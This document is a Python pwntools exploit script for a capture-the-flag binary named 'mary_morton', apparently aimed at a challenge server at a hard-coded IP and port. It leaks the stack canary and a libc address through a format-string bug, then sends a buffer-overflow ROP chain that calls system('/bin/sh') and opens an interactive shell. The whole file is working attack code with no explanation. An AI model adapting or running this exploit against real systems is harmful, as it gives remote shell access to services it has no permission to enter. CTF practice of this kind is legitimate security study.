from pwn import *
import sys
import time

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./mary_morton")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./mary_morton")
else:
	p = remote("111.198.29.45","48019")
	libc = ELF("./libc-2.23.so")
	elf = ELF("./mary_morton")

def menu(choice):
	p.sendlineafter("3. Exit the battle \n",str(choice))

def prt(payload):
	menu(2)
	time.sleep(0.5)
	p.send(payload.ljust(0x7f,"\x00"))

def rop(payload):
	menu(1)
	time.sleep(0.5)
	p.send(payload)

def debugf():
	if debug:
		gdb.attach(p,"b printf")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
off1 = 0x1a - 1 + 6
off2 = 0x1c - 1 + 6
prt("%{off1}$p\n%{off2}$p\n".format(off1 = off1,off2 = off2))
canary = int(p.recvuntil("\n",drop = True),16)
log.success("canary:" + hex(canary))
leak_addr = int(p.recvuntil("\n",drop = True),16)
libc.address = leak_addr - 240 - libc.symbols["__libc_start_main"]
log.success("libc_base:" + hex(libc.address))
rdi = 0x0000000000400ab3
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload = "a" * (0x90 - 0x8) + p64(canary) + p64(0) + p64(rdi) + p64(binsh) + p64(system)
rop(payload)
p.interactive()
